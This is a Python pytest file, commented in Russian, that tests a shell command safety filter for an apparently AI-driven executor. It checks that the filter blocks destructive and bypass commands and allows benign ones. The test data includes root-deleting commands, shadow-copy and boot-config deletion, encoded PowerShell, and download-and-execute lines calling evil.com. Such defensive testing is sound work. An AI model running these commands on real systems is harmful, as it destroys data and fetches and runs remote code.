"""Набор регрессионных и расширенных тестов безопасности оболочки ShellExecutor.

Проверяет блокировку всех выявленных Sonnet 5.5 векторов обхода (bypasses),
деструктивного удаления корневых путей независимо от порядка флагов,
опасных системных командлетов и разрешает выполнение легитимных команд.
"""

from __future__ import annotations

from unittest.mock import MagicMock, patch

import pytest

from core.os_controller import DangerousCommandError, ShellExecutor


class TestShellSecurityPolish:
    """Комплексная проверка безопасности выполнения команд ShellExecutor."""

    @pytest.fixture
    def executor(self) -> ShellExecutor:
        """Фикстура создания экземпляра ShellExecutor."""
        return ShellExecutor()

    @pytest.mark.parametrize(
        "dangerous_cmd",
        [
            r"Remove-Item C:\ -Recurse -Force",
            "Remove-Item -Path C:/ -Recurse",
            "rd /s /q C:\\",
            "rm -fr /",
            "shutdown /s",
            "Clear-Disk",
            r"reg delete HKLM\Software\Test",
            "iex (iwr http://evil.com)",
            "Invoke-Expression (New-Object Net.WebClient).DownloadString('http://...')",
            "vssadmin delete shadows",
            "bcdedit /delete",
            r"del /s /q d:\*",
        ],
    )
    def test_sonnet_bypasses_blocked_in_is_safe_command(
        self, executor: ShellExecutor, dangerous_cmd: str
    ) -> None:
        """Проверка блокировки всех 12 векторов обхода, выявленных аудитом Sonnet 5.5."""
        is_safe, pattern_or_reason = executor.is_safe_command(dangerous_cmd)
        assert is_safe is False, f"Команда должна быть заблокирована: {dangerous_cmd}"
        assert pattern_or_reason is not None

    @pytest.mark.parametrize(
        "dangerous_cmd",
        [
            r"Remove-Item C:\ -Recurse -Force",
            "Remove-Item -Path C:/ -Recurse",
            "rd /s /q C:\\",
            "rm -fr /",
            "shutdown /s",
            "Clear-Disk",
            r"reg delete HKLM\Software\Test",
            "iex (iwr http://evil.com)",
            "Invoke-Expression (New-Object Net.WebClient).DownloadString('http://...')",
            "vssadmin delete shadows",
            "bcdedit /delete",
            r"del /s /q d:\*",
        ],
    )
    def test_sonnet_bypasses_raise_dangerous_command_error(
        self, executor: ShellExecutor, dangerous_cmd: str
    ) -> None:
        """Проверка вызова исключения DangerousCommandError при запуске опасных команд."""
        with pytest.raises(DangerousCommandError):
            executor.run_command(dangerous_cmd)

    @pytest.mark.parametrize(
        "variation_cmd",
        [
            r"remove-item c:\ -recurse -force",
            "REMOVE-ITEM -PATH 'C:/' -RECURSE",
            r"ri C:\ -Force",
            "erase /f /q c:\\",
            "rm -r -f /",
            "rm -rf /*",
            "del /s /q e:/*",
            "shutdown -s",
            "shutdown /r /t 0",
            "shutdown -r",
            "format d:",
            "format-volume",
            "initialize-disk",
            "(New-Object Net.WebClient).DownloadFile('http://evil.com/payload.exe', 'payload.exe')",
            r"reg delete HKCU\Software\Policies /f",
            "diskpart /s script.txt",
            "stop-computer -force",
            "restart-computer -force",
            "format C:\\",
            "format c:/",
            "powershell -enc ZABpAHIA",
            "powershell -EncodedCommand ZABpAHIA",
            "pwsh -e ZABpAHIA",
            "i`e`x (calc.exe)",
            "[Convert]::FromBase64String('XYZ')",
            "[ScriptBlock]::Create('evil')",
            "Remove-Item $env:SystemRoot -Recurse -Force",
            "del -r ~",
        ],
    )
    def test_dangerous_cmdlet_and_flag_variations_blocked(
        self, executor: ShellExecutor, variation_cmd: str
    ) -> None:
        """Проверка устойчивости защиты к вариациям регистра, алиасов и порядка параметров."""
        is_safe, reason = executor.is_safe_command(variation_cmd)
        assert is_safe is False, f"Вариация должна быть заблокирована: {variation_cmd}"
        assert reason is not None

    @pytest.mark.parametrize(
        "safe_cmd",
        [
            "dir",
            "Get-Process",
            "echo hello",
            "ipconfig",
            "git status",
            "python --version",
            "Get-ChildItem -Path .",
            "Get-Date",
            'Write-Output "Safe message"',
            "del test.txt",
            "Remove-Item ./temp.log",
        ],
    )
    def test_legitimate_commands_allowed(self, executor: ShellExecutor, safe_cmd: str) -> None:
        """Проверка того, что легитимные команды и утилиты проходят проверку безопасности."""
        is_safe, reason = executor.is_safe_command(safe_cmd)
        assert is_safe is True, f"Легитимная команда не должна блокироваться: {safe_cmd} ({reason})"
        assert reason is None

    def test_empty_and_whitespace_commands_are_safe(self, executor: ShellExecutor) -> None:
        """Пустые строки и пробельные команды безопасны и возвращают (True, None)."""
        assert executor.is_safe_command("") == (True, None)
        assert executor.is_safe_command("   \t  \n ") == (True, None)

    def test_run_command_executes_safe_command(self, executor: ShellExecutor) -> None:
        """Безопасная команда передается на выполнение в powershell."""
        mock_res = MagicMock()
        mock_res.returncode = 0
        mock_res.stdout = "Python 3.12\n"
        mock_res.stderr = ""

        with patch("subprocess.run", return_value=mock_res) as mock_run:
            code, stdout, stderr = executor.run_command("python --version")
            assert code == 0
            assert "Python 3.12" in stdout
            assert stderr == ""
            mock_run.assert_called_once()
